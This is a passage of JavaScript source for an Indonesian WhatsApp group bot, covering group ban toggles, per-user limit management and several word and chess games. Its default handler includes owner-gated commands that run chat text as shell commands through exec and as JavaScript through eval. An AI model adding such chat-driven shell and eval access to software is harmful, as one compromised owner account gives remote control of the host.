                    reply(`❌ Terjadi kesalahan sistem saat menyimpan file:\n${e.message}`);
                }
            }
                break;

            case 'banchat':
            case 'bnc': {
                if (!isAn) return reply('❌ *Akses Ditolak!*\nFitur ini khusus untuk Owner.');

                // Pastikan struktur database / variabel global aman
                if (!global.db) global.db = { data: { chats: {} } };
                if (!global.db.data) global.db.data = { chats: {} };
                if (!global.db.data.chats) global.db.data.chats = {};
                if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};

                global.db.data.chats[m.chat].isBanned = true;

                let teksBan = `╭──〔 *🔇 SYSTEM BOT* 〕──╮\n`;

                teksBan += `│ Bot telah dinonaktifkan di grup ini.\n`;
                teksBan += `│ Member tidak bisa menggunakan fitur bot.\n`;

                teksBan += `╰──────────────────╯`;

                reply(teksBan);
            }
                break;

            case 'unbanchat':
            case 'unbnc': {
                if (!isAn) return reply('❌ *Akses Ditolak!*\nFitur ini khusus untuk Owner.');

                // Pastikan struktur database / variabel global aman
                if (!global.db) global.db = { data: { chats: {} } };
                if (!global.db.data) global.db.data = { chats: {} };
                if (!global.db.data.chats) global.db.data.chats = {};
                if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};

                global.db.data.chats[m.chat].isBanned = false;

                let teksUnban = `╭──〔 *🔊 SYSTEM BOT* 〕──╮\n`;

                teksUnban += `│ Bot telah diaktifkan kembali.\n`;
                teksUnban += `│ Member sudah bisa menggunakan fitur bot.\n`;

                teksUnban += `╰──────────────────╯`;

                reply(teksUnban);
            }
                break;



            case 'susunkata': {
                if (!m.isGroup) return reply(mess.group);

                // Deklarasi session game global jika belum ada
                global.susunkata = global.susunkata || {};
                let id = m.chat;

                if (id in global.susunkata) {
                    return reply('❌ Masih ada soal yang belum terjawab di grup ini!\nSelesaikan dulu atau ketik *.nyerah*');
                }

                await sock.sendMessage(m.chat, { react: { text: "🎮", key: m.key } });

                try {
                    // Fetch data soal dari github BochilTeam
                    const { data } = await axios.get('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json');
                    const json = data[Math.floor(Math.random() * data.length)];

                    const timeout = 60000; // 60 detik
                    // Randomize Poin: 5.000 sampai 15.000
                    const reward = Math.floor(Math.random() * (15000 - 5000 + 1)) + 5000;

                    let captionText = `╭───〔 *GAME SUSUN KATA* 〕────╮\n`;

                    captionText += `│ 🔤 *Soal* : ${json.soal}\n`;
                    captionText += `│ 💡 *Tipe* : ${json.tipe}\n`;
                    captionText += `│ 💰 *Hadiah* : ${reward.toLocaleString('id-ID')} Poin\n`;
                    captionText += `│ ⏱️ *Waktu* : ${(timeout / 1000)} Detik\n`;
                    captionText
                    captionText += `╰───────────────────────╯\n\n`;
                    captionText += `> Langsung ketik jawaban di grup ini.\n`;
                    captionText += `> Ketik *${prefix}bantuan* untuk clue.\n`;
                    captionText += `> Ketik *${prefix}nyerah* jika tidak sanggup.`;

                    let msgStatus = await sock.sendMessage(m.chat, { text: captionText }, { quoted: m });

                    // Simpan sesi game ke dalam memori global
                    global.susunkata[id] = [
                        msgStatus,
                        json,
                        reward,
                        setTimeout(() => {
                            if (global.susunkata[id]) {
                                let textTimeOut = `⏳ *WAKTU HABIS!*\n\nSayang sekali tidak ada yang berhasil menjawab.\nJawaban yang benar adalah: *${json.jawaban}*\n\n> © @VannessWangsaff ID V3`;
                                sock.sendMessage(m.chat, { text: textTimeOut }, { quoted: global.susunkata[id][0] });
                                delete global.susunkata[id];
                            }
                        }, timeout)
                    ];
                } catch (err) {
                    console.error("[SUSUNKATA ERROR]", err);
                    reply('❌ Gagal mengambil data soal dari server.');
                }
            }
                break;

            case 'bantuan':
            case 'clue': {
                if (!m.isGroup) return reply(mess.group);
                global.susunkata = global.susunkata || {};
                let id = m.chat;

                if (!(id in global.susunkata)) {
                    return reply('❌ Tidak ada game susun kata yang sedang berlangsung di grup ini!');
                }

                let json = global.susunkata[id][1];
                let ans = json.jawaban;

                // Membuat clue: Mengubah huruf menjadi huruf samar (_) kecuali huruf depan/belakang atau vokal
                let hint = ans.replace(/[bcdfghjklmnpqrstvwxyz]/gi, '_');

                reply(`💡 *BANTUAN CLUE:*\n\nKata: \`${hint}\`\n\nAyo tebak lagi, waktumu terus berjalan!`);
            }
                break;

            case 'nyerah':
            case 'surrend': {
                if (!m.isGroup) return reply(mess.group);
                global.susunkata = global.susunkata || {};
                let id = m.chat;

                if (!(id in global.susunkata)) {
                    return reply('❌ Tidak ada game susun kata yang sedang berlangsung di grup ini!');
                }

                let json = global.susunkata[id][1];

                // Hapus timer agar bot tidak mengirim pesan waktu habis
                clearTimeout(global.susunkata[id][3]);
                delete global.susunkata[id];

                reply(`🏳️ *YAH KOK NYERAH...*\n\nPermainan dihentikan!\nJawaban yang benar adalah: *${json.jawaban}*\n\nKetik *${prefix}susunkata* untuk mulai bermain lagi.`);
            }
                break;

            case 'ceklimit':
            case 'me':
            case 'profile': {
                // Tentukan status user (sesuaikan variabel isOwner dengan kodemu, misalnya isAn)
                const isOwner = isAn;
                const isPremium = db.isPremium(m.sender);

                // 1. Sinkronisasi & Reset limit harian otomatis (jika ganti hari)
                db.checkAndResetLimit(m.sender, isOwner, isPremium);

                // 2. Ambil data user
                let userLimit = db.getLimit(m.sender);
                let maxLimit = db.getDisplayMaxLimit(m.sender, isOwner, isPremium);
                let userStats = db.getUser(m.sender);

                let statusText = isOwner ? '👑 Developer' : isPremium ? '💎 Premium User' : '👤 Free User';

                let txt = `╭──〔 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈* 〕─╮\n`;
                txt
                txt += `│ 🆔 *ɴᴀᴍᴇ* : @${m.sender.split('@')[0]}\n`;
                txt += `│ 🔰 *sᴛᴀᴛᴜs* : ${statusText}\n`;
                txt += `│ ⚡ *ʟɪᴍɪᴛ* : ${userLimit} / ${maxLimit}\n`;
                txt += `│ 💬 *ᴛᴏᴛᴀʟ ᴄʜᴀᴛ* : ${userStats.messageCount}\n`;

                txt += `╰────────────────────╯\n\n`;
                txt += `> _Limit akan di-reset otomatis setiap hari_.\n`;
                txt += `> © @VannessWangsaff ID V3`;

                await sock.sendMessage(m.chat, {
                    text: txt,
                    mentions: [m.sender]
                }, { quoted: m });
            }
                break;

            case 'addlimit': {
                if (!isAn) return reply('❌ Akses Ditolak: Fitur ini khusus Developer/Owner!')

                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '').split(' ')[0] + '@s.whatsapp.net'
                let amount = parseInt(args[args.length - 1]) // Ambil angka dari argumen terakhir

                if (!users || isNaN(amount)) return reply(`Tag/Reply user dan masukkan jumlah limit.\nContoh: ${prefix + command} @user 50`)

                // Sesuaikan dengan logic database kamu (contoh: db.addLimit)
                db.addLimit(users, amount)
                let currentLimit = db.getLimit(users)

                let teks = `╭──〔 *SYSTEM LIMIT UPDATE* 〕─╮\n`

                teks += `│ 👤 *Target* : @${users.split('@')[0]}\n`
                teks += `│ 📈 *Aksion* : Penambahan Limit\n`
                teks += `│ 💰 *Jumlah* : +${amount}\n`
                teks += `│ 📊 *Total Limit* : ${currentLimit}\n`
                teks += `│ 💠 *Status* : SUCCESS\n`

                teks += `╰─────────────────────╯\n`
                teks += `> © @VannessWangsaff ID V3`

                await sock.sendMessage(m.chat, { text: teks, mentions: [users] }, { quoted: m })
            }
                break

            case 'kuranglimit':
            case 'reducelimit': {
                if (!isAn) return reply('❌ Akses Ditolak: Fitur ini khusus Developer/Owner!')

                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '').split(' ')[0] + '@s.whatsapp.net'
                let amount = parseInt(args[args.length - 1])

                if (!users || isNaN(amount)) return reply(`Tag/Reply user dan masukkan jumlah potong limit.\nContoh: ${prefix + command} @user 10`)

                // Sesuaikan dengan logic database kamu
                db.reduceLimit(users, amount)
                let currentLimit = db.getLimit(users)

                let teks = `╭──〔 *SYSTEM LIMIT UPDATE* 〕─╮\n`
                teks += `│\n`
                teks += `│ 👤 *Target* : @${users.split('@')[0]}\n`
                teks += `│ 📉 *Aksion* : Pengurangan Limit\n`
                teks += `│ 💸 *Jumlah* : -${amount}\n`
                teks += `│ 📊 *Sisa Limit* : ${currentLimit}\n`
                teks += `│ 💠 *Status* : SUCCESS\n`

                teks += `╰─────────────────────╯\n`
                teks += `> © @VannessWangsaff ID V3`

                await sock.sendMessage(m.chat, { text: teks, mentions: [users] }, { quoted: m })
            }
                break

            case 'editlimit':
            case 'setlimit': {
                if (!isAn) return reply('❌ Akses Ditolak: Fitur ini khusus Developer/Owner!')

                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '').split(' ')[0] + '@s.whatsapp.net'
                let amount = parseInt(args[args.length - 1])

                if (!users || isNaN(amount)) return reply(`Tag/Reply user dan masukkan nominal limit baru.\nContoh: ${prefix + command} @user 100`)

                // Sesuaikan dengan logic database kamu
                db.setLimitState(users, amount)

                let teks = `╭──〔 *SYSTEM LIMIT UPDATE* 〕─╮\n`

                teks += `│ 👤 *Target* : @${users.split('@')[0]}\n`
                teks += `│ ⚙️ *Aksion* : Edit Limit Baru\n`
                teks += `│ 📊 *Limit Saat Ini* : ${amount}\n`
                teks += `│ 💠 *Status* : SUCCESS\n`

                teks += `╰─────────────────────╯\n`
                teks += `> © @VannessWangsaff ID V3`

                await sock.sendMessage(m.chat, { text: teks, mentions: [users] }, { quoted: m })
            }
                break

            case 'dellimit':
            case 'hapuslimit': {
                if (!isAn) return reply('❌ Akses Ditolak: Fitur ini khusus Developer/Owner!')

                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '').split(' ')[0] + '@s.whatsapp.net'
                if (!users) return reply(`Tag/Reply user yang ingin direset limitnya.\nContoh: ${prefix + command} @user`)

                // Reset limit menjadi 0
                db.setLimitState(users, 0)

                let teks = `╭──〔 *SYSTEM LIMIT UPDATE* 〕─╮\n`

                teks += `│ 👤 *Target* : @${users.split('@')[0]}\n`
                teks += `│ 🗑️ *Aksion* : Hapus/Reset Limit (0)\n`
                teks += `│ 💠 *Status* : SUCCESS\n`

                teks += `╰─────────────────────╯\n`
                teks += `> © @VannessWangsaff ID V3`

                await sock.sendMessage(m.chat, { text: teks, mentions: [users] }, { quoted: m })
            }
                break

            case 'listuserlimit':
            case 'listlimit': {
                if (!isAn) return reply('❌ Akses Ditolak: Fitur ini khusus Developer/Owner!')

                await sock.sendMessage(m.chat, { react: { text: "🔍", key: m.key } })

                let allUsers = {}
                try {
                    allUsers = JSON.parse(fs.readFileSync('./data/users.json', 'utf8'))
                } catch (err) {
                    return reply('❌ Gagal membaca database user.')
                }

                // Filter dan urutkan user berdasarkan limit terbanyak
                let sortedUsers = Object.entries(allUsers)
                    .map(([jid, data]) => ({ jid, limit: data.limit || 0 }))
                    .sort((a, b) => b.limit - a.limit)
                    .slice(0, 20) // Menampilkan Top 20

                if (sortedUsers.length === 0) return reply('Belum ada data user dengan limit di database.')

                let teks = `╭──〔 *DATABASE LIMIT USER* 〕─╮\n`

                teks += `│ 🏆 *Top 20 User Limit Terbanyak*\n`
                teks += `│\n`

                let mentions = []
                sortedUsers.forEach((u, i) => {
                    teks += `│⌯⌲ ${i + 1}. @${u.jid.split('@')[0]} ( ${u.limit} Limit )\n`
                    mentions.push(u.jid)
                })


                teks += `╰─────────────────────╯\n`
                teks += `> © @VannessWangsaff ID V3`

                await sock.sendMessage(m.chat, { text: teks, mentions: mentions }, { quoted: m })
            }
                break

            case 'tebakkata': {
                // 1. Buat wadah sesi game jika belum ada
                global.tebakkata = global.tebakkata ? global.tebakkata : {};

                // 2. Cek apakah di grup/chat ini masih ada game yang belum selesai
                if (global.tebakkata[m.chat]) return reply('❌ Masih ada game yang belum diselesaikan di chat ini!');

                // Ambil data soal dari folder data/susunkata.json
                let dataTebakan;
                try {
                    const path = './data/tebakkata.json';
                    if (fsSync.existsSync(path)) {
                        dataTebakan = JSON.parse(fsSync.readFileSync(path, 'utf-8'));
                    } else {
                        throw new Error("File not found");
                    }
                } catch (err) {
                    console.log("File susunkata.json tidak ditemukan, menggunakan soal darurat.");
                    dataTebakan = [
                        { soal: "A - N - D - R - I", jawaban: "Vanness" }
                    ];
                }

                // 4. Pilih soal acak
                let result = dataTebakan[Math.floor(Math.random() * dataTebakan.length)];
                console.log("Jawaban Tebak Kata: " + result.jawaban); // Log jawaban di console biar owner tau

                let timeout = 120000; // Waktu habis (2 menit)
                let poin = 2; // Hadiah limit

                let teksGame = `╭─〔 *🎮 GAME TEBAK KATA* 〕─╮\n`;

                teksGame += `│ ❓ *Soal* : ${result.soal}\n`;
                teksGame += `│ ⏳ *Waktu* : ${(timeout / 1000)} Detik\n`;
                teksGame += `│ 🎁 *Hadiah* : ${poin} Limit\n`;
                teksGame += `│\n`;
                teksGame += `│ _Reply pesan ini untuk menjawab!_\n`;
                teksGame += `│ _Ketik .nyerah untuk menyerah_\n`;
                teksGame += `│ _Ketik .bantuan untuk hint_\n`;
                teksGame += `╰──────────────────╯`;

                // 5. Simpan sesi game ke global object
                global.tebakkata[m.chat] = [
                    await sock.sendMessage(m.chat, {
                        image: { url: global.thumb }, // Pakai thumbnail global bot kamu
                        caption: teksGame
                    }, { quoted: m }),
                    result,
                    poin,
                    setTimeout(() => {
                        if (global.tebakkata[m.chat]) {
                            sock.sendMessage(m.chat, {
                                text: `⏳ Waktu habis!\nJawaban yang benar adalah: *${global.tebakkata[m.chat][1].jawaban}*`
                            }, { quoted: global.tebakkata[m.chat][0] });
                            delete global.tebakkata[m.chat]; // Hapus sesi
                        }
                    }, timeout)
                ];
            }
                break

            case 'ulartangga':
            case 'ut':
            case 'sl': {
                if (!m.isGroup) return reply('❌ Command ini khusus untuk di dalam grup!');
                await utCommand(sock, m, args, prefix, isAn);
            }
                break;

            case 'tebaktebakan': {
                if (!m.isGroup) return reply(mess.group); // Pastikan ada response 'mess.group' di file kamu

                // 1. Buat wadah sesi game jika belum ada
                global.tebaktebakan = global.tebaktebakan || {};

                // 2. Cek apakah di grup/chat ini masih ada game yang belum selesai
                if (global.tebaktebakan[m.chat]) return reply('❌ Masih ada game tebak-tebakan yang belum diselesaikan di chat ini!');

                // 3. Ambil data soal
                let dataTebakan;
                try {
                    // Membaca file json lokal (Pastikan file ini ada)
                    dataTebakan = JSON.parse(fs.readFileSync('./data/tebaktebakan.json', 'utf-8'));
                } catch (err) {
                    console.log("File tebaktebakan.json tidak ditemukan, menggunakan soal darurat.");
                    // Fallback kalau file json kamu hilang/error
                    dataTebakan = [
                        { soal: "Pintu apa yang kalau didorong nggak bisa kebuka?", jawaban: "pintu geser" },
                        { soal: "Kutu apa yang paling mengerikan?", jawaban: "kutukan" }
                    ];
                }

                // 4. Pilih soal acak
                let result = dataTebakan[Math.floor(Math.random() * dataTebakan.length)];
                console.log("Jawaban Tebak-tebakan: " + result.jawaban); // Log jawaban di console

                let timeout = 60000; // Waktu habis (60 detik)
                let poin = 200; // Hadiah limit

                let teksGame = `╭──〔 *🤔 TEBAK TEBAKAN* 〕──╮\n`;
                teksGame += `│\n`;
                teksGame += `│ ❓ *Soal* : ${result.soal}\n`;
                teksGame += `│ ⏳ *Waktu* : ${(timeout / 1000)} Detik\n`;
                teksGame += `│ 🎁 *Hadiah* : ${poin} Limit\n`;
                teksGame += `│\n`;
                teksGame += `│ _Ketik jawaban langsung di grup ini_\n`;
                teksGame += `│ _Ketik *nyerah* untuk menyerah_\n`;
                teksGame += `│ _Ketik *bantuan* untuk hint_\n`;
                teksGame += `╰─────────────────────╯\n`;
                teksGame += `> © @VannessWangsaff ID V3`;

                // 5. Simpan sesi game ke global object
                global.tebaktebakan[m.chat] = [
                    await sock.sendMessage(m.chat, {
                        image: { url: global.thumb },   // Pakai thumbnail bot kamu
                        caption: teksGame
                    }, { quoted: m }),
                    result,
                    poin,
                    setTimeout(() => {
                        if (global.tebaktebakan[m.chat]) {
                            sock.sendMessage(m.chat, {
                                text: `⏳ *Waktu habis!*\nJawaban yang benar adalah: *${global.tebaktebakan[m.chat][1].jawaban}*`
                            }, { quoted: global.tebaktebakan[m.chat][0] });
                            delete global.tebaktebakan[m.chat]; // Hapus sesi
                        }
                    }, timeout)
                ];
            }
                break



            case 'asahotak': {
                if (!m.isGroup) return reply(mess.group);

                let biaya = 2;
                let reward = 5;

                // CEK LIMIT
                try {
                    if (db && typeof db.isLimit === 'function') {
                        if (db.isLimit(m.sender, biaya)) {
                            return reply("Limit kamu habis!");
                        }
                        db.reduceLimit(m.sender, biaya);
                    }
                } catch (e) {
                    console.log("Limit error:", e);
                }

                // CEK GAME MASIH ADA
                if (global.asahotak[m.chat]) {
                    return reply("Masih ada soal yang belum dijawab!");
                }


                let data = JSON.parse(fs.readFileSync('./data/asahotak.json'));
                let { soal, jawaban } = data[Math.floor(Math.random() * data.length)];

                console.log('Jawaban : ' + jawaban);

                let petunjuk = jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');

                let gamewaktu = 60; // detik

                await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(petunjuk)}\n\nKetik *nyerah* untuk menyerah\nWaktu: ${gamewaktu} detik`);

                global.asahotak[m.chat] = {
                    soal,
                    jawaban: jawaban.toLowerCase(),
                    waktu: setTimeout(() => {
                        if (global.asahotak[m.chat]) {
                            reply(`⏰ *WAKTU HABIS!*\n\nSoal:\n${monospace(soal)}\n\nJawaban: ${monospace(jawaban)}`);
                            delete global.asahotak[m.chat];
                        }
                    }, gamewaktu * 1000)
                };
            }
                break;

            case 'catur':
            case 'chess': {
                if (!m.isGroup) return reply(mess.group);
                const key = m.chat; // ID Grup atau Chat Pribadi

                // Inisialisasi memori permainan jika belum ada di chat ini
                chessSessions[key] = chessSessions[key] || {
                    gameData: null,
                    fen: null,
                    currentTurn: null,
                    players: [],
                    hasJoined: []
                };

                let chessData = chessSessions[key];
                const { gameData, fen, currentTurn, players, hasJoined } = chessData;
                const feature = args[0] ? args[0].toLowerCase() : '';

                // 1. Hentikan Permainan
                if (feature === 'delete') {
                    delete chessSessions[key];
                    return reply('🏳️ *Permainan catur dihentikan.*');
                }

                // 2. Buat Ruangan
                if (feature === 'create') {
                    if (gameData) return reply('⚠️ *Permainan sudah dimulai.*');

                    chessData.gameData = {
                        status: 'waiting',
                        black: null,
                        white: null
                    };
                    return reply('🎮 *Permainan catur dimulai.*\nMenunggu pemain lain untuk bergabung.');
                }

                // 3. Bergabung ke Permainan
                if (feature === 'join') {
                    const senderId = m.sender;
                    if (players.includes(senderId)) return reply('🙅‍♂️ *Anda sudah bergabung dalam permainan ini.*');
                    if (!gameData || gameData.status !== 'waiting') return reply('⚠️ *Tidak ada permainan catur yang sedang menunggu.*\nKetik *' + prefix + 'chess create* untuk membuat room.');
                    if (players.length >= 2) return reply('👥 *Pemain sudah mencukupi.*\nPermainan otomatis dimulai.');

                    players.push(senderId);
                    hasJoined.push(senderId);

                    if (players.length === 2) {
                        gameData.status = 'ready';
                        // Acak warna bidak
                        const [black, white] = Math.random() < 0.5 ? [players[1], players[0]] : [players[0], players[1]];
                        gameData.black = black;
                        gameData.white = white;
                        chessData.currentTurn = white; // Putih jalan duluan

                        let joinText = `🙌 *Pemain yang telah bergabung:*\n${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}\n\n`;
                        joinText += `*Hitam:* @${black.split('@')[0]}\n*Putih:* @${white.split('@')[0]}\n\n`;
                        joinText += `Silakan ketik *${prefix}chess start* untuk memunculkan papan permainan.`;

                        return sock.sendMessage(m.chat, { text: joinText, mentions: hasJoined }, { quoted: m });
                    } else {
                        return reply('🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu 1 pemain lagi...');
                    }
                }

                // 4. Memulai Permainan (Memunculkan Papan)
                if (feature === 'start') {
                    if (!gameData || gameData.status !== 'ready') return reply('⚠️ *Tidak dapat memulai permainan. Tunggu hingga dua pemain bergabung.*');

                    gameData.status = 'playing';
                    const senderId = m.sender;

                    if (players.length === 2) {
                        const startFen = 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1';
                        chessData.fen = startFen;
                        const encodedFen = encodeURIComponent(startFen);
                        const giliran = `🎲 *Giliran:* Putih @${gameData.white.split('@')[0]}`;

                        // Atur rotasi papan sesuai warna pemain
                        const flipParam = senderId === gameData.black ? '' : '&flip=true';
                        const flipParam2 = senderId === gameData.black ? '' : '-flip';
                        const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;

                        await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                        try {
                            await sock.sendMessage(m.chat, { image: { url: boardUrl }, caption: giliran, mentions: [gameData.white] }, { quoted: m });
                        } catch (error) {
                            // Fallback API jika chess.com error
                            const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
                            await sock.sendMessage(m.chat, { image: { url: boardUrl2 }, caption: giliran, mentions: [gameData.white] }, { quoted: m });
                        }
                        return;
                    }
                }

                // 5. Menu Bantuan
                if (feature === 'help') {
                    return reply(`🌟 *Perintah Permainan Catur:*\n\n∘ *${prefix}chess create* - Mulai game\n∘ *${prefix}chess join* - Bergabung ke game\n∘ *${prefix}chess start* - Munculkan papan\n∘ *${prefix}chess delete* - Hapus sesi game\n∘ *${prefix}chess [dari] [ke]* - Melangkah\n\n*Contoh Melangkah:*\nKetik *${prefix}chess e2 e4*`);
                }

                // 6. Logika Bergerak (Move)
                if (args[0] && args[1]) {
                    const senderId = m.sender;
                    if (!gameData || gameData.status !== 'playing') return reply('⚠️ *Permainan belum dimulai atau belum di-start.*');

                    if (currentTurn !== senderId) {
                        const currentTurnWarna = chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam';
                        return sock.sendMessage(m.chat, { text: `⏳ *Bukan giliranmu!*\nSekarang giliran ${currentTurnWarna} bergerak.`, mentions: [currentTurn] }, { quoted: m });
                    }

                    const chess = new Chess(fen);

                    // Cek jika status game sudah berakhir sebelum langkah diambil (dari langkah musuh sebelumnya)
                    if (chess.isCheckmate()) {
                        delete chessSessions[key];
                        return sock.sendMessage(m.chat, { text: `⚠️ *Game Checkmate!*\n🏳️ *Permainan selesai.*\n*Pemenang:* @${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m });
                    }
                    if (chess.isDraw()) {
                        delete chessSessions[key];
                        return sock.sendMessage(m.chat, { text: `⚠️ *Game Seri (Draw)!*\n🏳️ *Permainan selesai.*\n*Pemain:* ${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}`, mentions: hasJoined }, { quoted: m });
                    }

                    const from = args[0].toLowerCase();
                    const to = args[1].toLowerCase();

                    // Coba lakukan pergerakan
                    try {
                        chess.move({ from, to, promotion: 'q' }); // Otomatis promosi jadi Queen
                    } catch (e) {
                        return reply('❌ *Langkah tidak valid.*\nPastikan koordinatnya benar, contoh: *' + prefix + 'chess e2 e4*');
                    }

                    // Simpan state permainan terbaru
                    chessData.fen = chess.fen();

                    // Ganti giliran
                    const currentTurnIndex = players.indexOf(currentTurn);
                    const nextTurnIndex = (currentTurnIndex + 1) % 2;
                    chessData.currentTurn = players[nextTurnIndex];

                    const encodedFen = encodeURIComponent(chess.fen());
                    const currentColor = chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam';
                    const giliran = `🎲 *Giliran:* ${currentColor} @${chessData.currentTurn.split('@')[0]}\n\n${chess.getComment() || ''}`;

                    const flipParam = senderId === gameData.black ? '' : '&flip=true';
                    const flipParam2 = senderId === gameData.black ? '' : '-flip';
                    const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;

                    await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                    try {
                        await sock.sendMessage(m.chat, { image: { url: boardUrl }, caption: giliran, mentions: [chessData.currentTurn] }, { quoted: m });
                    } catch (error) {
                        const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
                        await sock.sendMessage(m.chat, { image: { url: boardUrl2 }, caption: giliran, mentions: [chessData.currentTurn] }, { quoted: m });
                    }

                    chess.deleteComment();
                    return;
                }

                // Default response jika command tidak dikenali
                return reply(`❓ Perintah tidak lengkap.\nGunakan *"${prefix}chess help"* untuk melihat bantuan.`);
            }
                break;

            case 'skata':
            case 'sambungkata': {
                if (!m.isGroup) return reply(mess.group);
                const key = m.chat;

                // Inisialisasi sesi game jika belum ada
                skataSessions[key] = skataSessions[key] || {
                    status: 'wait',
                    player: [],
                    basi: [],
                    chatId: null
                };

                let room = skataSessions[key];
                const feature = args[0] ? args[0].toLowerCase() : '';

                // Hentikan Game Paksa
                if (feature === 'stop' || feature === 'delete') {
                    clearTimeout(room.waktu);
                    delete skataSessions[key];
                    return reply('🏳️ *Game sambung kata dihentikan secara paksa.*');
                }

                // Memulai Game
                if (feature === 'start') {
                    if (room.status === 'play') return reply('⚠️ *Game sudah dimulai!* Selesaikan terlebih dahulu.');
                    if (!room.player.includes(m.sender)) return reply('⚠️ Kamu belum ikut bergabung di game ini.');
                    if (room.player.length < 2) return reply('👥 *Pemain belum cukup!*\nMinimal butuh 2 orang untuk memulai game.');

                    room.status = 'play';
                    room.curr = room.player[0];
                    room.kata = await genKata();

                    let filterAwal = skataFilter(room.kata);
                    let textMsg = `🎮 *Game Sambung Kata Dimulai!*\n\nGiliran @${room.curr.split('@')[0]}\nMulai: *${room.kata.toUpperCase()}*\n*${filterAwal.toUpperCase()}... ?*\n\n*Reply pesan ini untuk menjawab!*\nKetik "nyerah" untuk menyerah.\nTotal Pemain: ${room.player.length}`;

                    let msg = await sock.sendMessage(m.chat, { text: textMsg, mentions: [room.curr] }, { quoted: m });
                    room.chatId = msg.key.id;

                    // Logika timeout awal
                    const timeoutFunc = async () => {
                        let elimIndex = room.player.indexOf(room.curr);
                        let eliminated = room.player.splice(elimIndex, 1)[0];

                        if (room.player.length === 1) {
                            let winner = room.player[0];
                            global.db.data.users[winner] = global.db.data.users[winner] || { limit: 0 };
                            global.db.data.users[winner].limit += 10;
                            sock.sendMessage(m.chat, { text: `⏰ Waktu habis!\n@${eliminated.split('@')[0]} tereliminasi.\n\n🏆 *Game Selesai!*\n@${winner.split('@')[0]} Bertahan dan Menang!\nHadiah: *+10 Limit*`, mentions: [eliminated, winner] });
                            delete skataSessions[m.chat];
                        } else {
                            if (elimIndex >= room.player.length) room.curr = room.player[0];
                            else room.curr = room.player[elimIndex];

                            let nextMsg = await sock.sendMessage(m.chat, { text: `⏰ Waktu habis!\n@${eliminated.split('@')[0]} tereliminasi.\n\nGiliran @${room.curr.split('@')[0]}\n*${filterAwal.toUpperCase()}... ?*\n\n*Reply pesan ini untuk menjawab!*`, mentions: [eliminated, room.curr] });
                            room.chatId = nextMsg.key.id;
                            room.waktu = setTimeout(timeoutFunc, 45000);
                        }
                    };

                    room.waktu = setTimeout(timeoutFunc, 45000);
                    return;
                }

                // Gabung (Join) Game - Default
                if (room.status === 'wait') {
                    if (room.player.includes(m.sender)) return reply('🙋‍♂️ *Kamu sudah terdaftar* dalam list pemain.');

                    room.player.push(m.sender);

                    let caption = `╔═〘 Daftar Player Sambung Kata 〙\n${room.player.map((v, i) => `╟ ${i + 1}. @${v.split('@')[0]}`).join('\n')}\n╚════\n\nKetik *${prefix}skata* untuk ikut.\nKetik *${prefix}skata start* untuk memulai.\nKetik *${prefix}skata delete untuk berhenti.`;
                    return sock.sendMessage(m.chat, { text: caption, mentions: room.player }, { quoted: m });
                } else {
                    return reply('⚠️ Game sedang berlangsung, tunggu hingga game ini selesai untuk bergabung.');
                }
            }
                break;

            default: {

                if (body.startsWith("$")) {
                    if (!isAn) return reply(mess.owner)
                    exec(body.slice(1).trim(), (err, stdout) => {
                        if (err) return m.reply(`${err}`);
                        if (stdout) return m.reply(`${stdout}`);
                    });
                }

                if (body.startsWith(">")) {
                    if (!isAn) return reply(mess.owner)
                    try {
                        let code = body.slice(1).trim();
                        let result = await eval(`(async () => { 
                try { return ${code} } catch { return await ${code} } 
            })()`);
                        m.reply(util.format(result));
                    } catch (e) {
                        m.reply(String(e));
                    }
                }

                if (body.startsWith("eval")) {
                    if (!isAn) return reply(mess.owner)
                    try {
                        let code = body.slice(4).trim();
                        let result = await eval(`(async () => {
                ${code}
            })()`);
                        m.reply(util.format(result));
                    } catch (e) {
                        m.reply(String(e));
                    }
                }

                // 📌 GAME FITUR
                if (m.isGroup && !isCmd && body) {
                    global.susunkata = global.susunkata || {};
                    let id = m.chat;

                    if (id in global.susunkata) {
                        let json = global.susunkata[id][1];
                        let reward = global.susunkata[id][2];
                        let userAnswer = body.toLowerCase().trim();
                        let correctAnswer = json.jawaban.toLowerCase().trim();

                        if (userAnswer === correctAnswer) {
                            // Jika jawaban benar
                            clearTimeout(global.susunkata[id][3]);
                            delete global.susunkata[id];

                            // Tambahkan sistem poin ke database bot kamu di sini (jika ada)
                            // Contoh: global.db.data.users[m.sender].money += reward;

                            let winText = `🎉 *TEBAKAN BENAR!* 🎉\n\n`;
                            winText += `Selamat @${m.sender.split('@')[0]}, kamu berhasil menyusun kata dengan benar!\n`;
                            winText += `💰 *Hadiah:* +${reward.toLocaleString('id-ID')} Poin\n\n`;
                            winText += `> © @VannessWangsaff ID V3`;

                            await sock.sendMessage(m.chat, {
                                text: winText,
                                mentions: [m.sender]
                            }, { quoted: m });

                            await sock.sendMessage(m.chat, { react: { text: "🎉", key: m.key } });
